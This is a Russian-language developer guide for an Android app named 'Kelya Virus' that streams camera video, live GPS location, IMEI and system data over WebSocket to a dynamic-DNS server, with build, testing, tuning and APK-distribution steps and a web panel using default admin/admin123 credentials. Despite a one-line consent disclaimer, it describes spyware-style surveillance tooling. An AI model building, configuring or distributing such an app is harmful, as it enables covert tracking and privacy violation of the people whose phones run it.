# 📱 Инструкция для Android разработчика - Kelya Virus

## 🎯 Что передает приложение

Приложение передает на сервер через WebSocket:

1. **📹 Видео поток** - кадры с камеры (передняя/задняя)
2. **📍 Геолокация** - GPS координаты в реальном времени
3. **🔋 Системная информация** - батарея, память, хранилище
4. **📱 Информация об устройстве** - модель, Android версия, IMEI

## 📦 Структура проекта

```
android-monitoring/
├── app/
│   ├── build.gradle.kts          # Зависимости и настройки
│   └── src/main/
│       ├── AndroidManifest.xml   # Разрешения
│       ├── java/com/monitoring/
│       │   ├── MainActivity.kt              # Главный экран
│       │   ├── service/
│       │   │   ├── MonitoringService.kt     # Фоновый сервис
│       │   │   └── WebSocketClient.kt       # WebSocket клиент
│       │   ├── collectors/
│       │   │   ├── CameraCollector.kt       # Сбор кадров камеры
│       │   │   ├── LocationCollector.kt     # Сбор геолокации
│       │   │   └── SystemCollector.kt       # Сбор системной инфы
│       │   └── utils/
│       │       └── DeviceId.kt              # ID устройства
│       └── res/
│           └── layout/
│               └── activity_main.xml        # UI
└── README.md
```

## ⚙️ Настройка для локального тестирования

### 1. Изменить URL сервера

Открой файл: `app/src/main/java/com/monitoring/service/MonitoringService.kt`

Найди строку:
```kotlin
const val SERVER_URL = "wss://kelyastream.duckdns.org/ws/device"
```

**Для локального тестирования замени на:**
```kotlin
const val SERVER_URL = "ws://192.168.1.XXX:5000/ws/device"
```

Где `192.168.1.XXX` - это IP адрес твоего компьютера в локальной сети.

**Как узнать свой IP:**
- Windows: `ipconfig` → найди IPv4 адрес
- Mac/Linux: `ifconfig` или `ip addr`

**Важно:** Убедись, что телефон и компьютер в одной Wi-Fi сети!

### 2. Для тестирования на реальном сервере

Используй:
```kotlin
const val SERVER_URL = "wss://kelyastream.duckdns.org/ws/device"
```

## 🚀 Как запустить и протестировать

### Шаг 1: Открыть проект в Android Studio

1. Открой Android Studio
2. File → Open → выбери папку `android-monitoring`
3. Дождись синхронизации Gradle

### Шаг 2: Настроить для локального теста

1. Узнай IP адрес компьютера (где запущен backend)
2. Измени `SERVER_URL` в `MonitoringService.kt` на `ws://ТВОЙ_IP:5000/ws/device`
3. Убедись, что backend запущен: `py start.py` (должен быть на порту 5000)

### Шаг 3: Собрать и установить

1. Подключи Android устройство через USB
2. Включи "Отладка по USB" в настройках разработчика
3. В Android Studio: Run → Run 'app' (или Shift+F10)
4. Приложение установится на телефон

### Шаг 4: Запустить мониторинг

1. Открой приложение на телефоне
2. Разреши все запрашиваемые разрешения (камера, геолокация)
3. Нажми "Start Monitoring"
4. Должно появиться уведомление "Monitoring Active"

### Шаг 5: Проверить на сервере

1. Открой веб-панель: http://localhost:3000 (или https://kelyastream.duckdns.org)
2. Залогинься: `admin` / `admin123`
3. Должна появиться карточка с твоим устройством
4. Нажми на карточку - увидишь:
   - 📹 Видео с камеры
   - 📍 Карту с геолокацией
   - 🔋 Информацию о системе

## 🔍 Что проверить

### ✅ Видео поток
- Открой детали устройства
- Переключись на вкладку "Camera"
- Должно появиться видео с камеры
- Попробуй переключить камеру (передняя/задняя)

### ✅ Геолокация
- Переключись на вкладку "Location"
- Должна появиться карта с твоим местоположением
- Двигайся - точка должна обновляться

### ✅ Системная информация
- Переключись на вкладку "System Info"
- Должна отображаться:
  - Модель устройства
  - Уровень батареи
  - Версия Android
  - Память и хранилище

### ✅ WebSocket соединение
- В логах Android Studio (LogCat) ищи сообщения:
  - "WebSocket connected" - соединение установлено
  - "Camera frame sent" - кадры отправляются
  - "Location sent" - геолокация отправляется

## 🐛 Отладка

### Проблема: Не подключается к серверу

**Проверь:**
1. Backend запущен? (`py start.py`)
2. Правильный IP адрес в `SERVER_URL`?
3. Телефон и компьютер в одной Wi-Fi сети?
4. Порт 5000 открыт в firewall?

**Для проверки соединения:**
```bash
# На компьютере проверь, что порт слушается
netstat -ano | findstr :5000
```

### Проблема: Нет видео

**Проверь:**
1. Разрешение на камеру выдано?
2. Камера работает в других приложениях?
3. В логах есть ошибки?

### Проблема: Нет геолокации

**Проверь:**
1. Разрешение на геолокацию выдано?
2. GPS включен на телефоне?
3. В настройках приложения разрешена геолокация?

## 📝 Формат данных

### Регистрация устройства
```json
{
  "type": "register",
  "device_info": {
    "id": "uuid-устройства",
    "name": "Имя устройства",
    "model": "Модель телефона",
    "android_version": "Версия Android"
  }
}
```

### Кадр камеры
```json
{
  "type": "camera_frame",
  "camera": "front" | "back",
  "frame": "base64-encoded-jpeg",
  "timestamp": 1234567890
}
```

### Геолокация
```json
{
  "type": "location",
  "latitude": 55.7558,
  "longitude": 37.6173,
  "accuracy": 10.5,
  "timestamp": 1234567890
}
```

### Системная информация
```json
{
  "type": "system_info",
  "battery_level": 85,
  "battery_status": "charging",
  "memory_total": 4096,
  "memory_available": 2048,
  "storage_total": 64000,
  "storage_available": 32000
}
```

## 🎨 Кастомизация

### Изменить FPS камеры
В `MonitoringService.kt`:
```kotlin
private val cameraFpsLimit = 10 // Измени на нужное значение
```

### Изменить интервал обновления геолокации
В `LocationCollector.kt`:
```kotlin
locationRequest.interval = 5000 // 5 секунд
```

### Изменить интервал системной информации
В `MonitoringService.kt`:
```kotlin
executor.scheduleAtFixedRate({...}, 10, 30, TimeUnit.SECONDS)
// Последний параметр - интервал в секундах
```

## 📦 Сборка APK для распространения

1. Build → Generate Signed Bundle / APK
2. Выбери APK
3. Создай новый keystore (или используй существующий)
4. Выбери release build variant
5. Готово! APK будет в `app/release/`

## 🔐 Безопасность

⚠️ **Важно:** Это приложение для мониторинга устройств. Используй только на своих устройствах или с явного разрешения владельца!

## 📞 Контакты для вопросов

Если что-то не работает:
1. Проверь логи в Android Studio (LogCat)
2. Проверь логи backend сервера
3. Убедись, что все зависимости установлены

## 🎯 Чеклист перед передачей

- [ ] Проект открывается в Android Studio
- [ ] Gradle синхронизируется без ошибок
- [ ] Приложение собирается (Build → Make Project)
- [ ] `SERVER_URL` настроен правильно
- [ ] Все разрешения запрашиваются
- [ ] Приложение запускается на устройстве
- [ ] Видео передается
- [ ] Геолокация передается
- [ ] Системная информация передается
- [ ] Устройство появляется в веб-панели

---

**Удачи! 🚀**

